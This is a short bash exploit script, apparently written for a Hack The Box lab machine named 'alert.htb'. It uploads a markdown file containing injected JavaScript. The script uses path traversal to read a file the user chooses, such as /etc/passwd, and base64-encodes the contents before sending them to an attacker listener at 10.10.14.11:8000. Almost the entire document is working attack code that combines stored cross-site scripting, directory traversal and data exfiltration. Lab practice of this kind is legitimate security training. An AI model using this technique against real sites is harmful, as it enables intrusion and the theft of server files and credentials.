#!/bin/bash

# Check if an argument was provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <filepath>"
    echo "Example: $0 /etc/passwd"
    exit 1
fi

# Store the user-provided filepath
FILEPATH="$1"

curl --path-as-is -s -k -X $'POST' \
    -H $'Host: alert.htb' -H $'Content-Length: 522' -H $'Cache-Control: max-age=0' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: http://alert.htb' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1kJRTLTBhkMaRCT8' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://alert.htb/index.php?page=alert' -H $'Connection: keep-alive' \
    --compressed \
    --data-binary $'------WebKitFormBoundary1kJRTLTBhkMaRCT8\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"exploit3.md\"\x0d\x0aContent-Type: text/markdown\x0d\x0a\x0d\x0a<script>\x0avar xmlHttp = new XMLHttpRequest();\x0axmlHttp.open( \"POST\", \"http://alert.htb/messages.php?file=../../../../../../../../../../../../'"$FILEPATH"$'\",false );\x0axmlHttp.send( );\x0avar xmlHttp2 = new XMLHttpRequest();\x0axmlHttp2.open( \"GET\", \"http://10.10.14.11:8000?suction=\"+btoa(xmlHttp.responseText),true );\x0axmlHttp2.send( );\x0a</script>\x0a\x0d\x0a------WebKitFormBoundary1kJRTLTBhkMaRCT8--\x0d\x0a' \
    $'http://alert.htb/visualizer.php' | grep -o 'href="[^"]*"' | grep -o 'http://[^"]*'
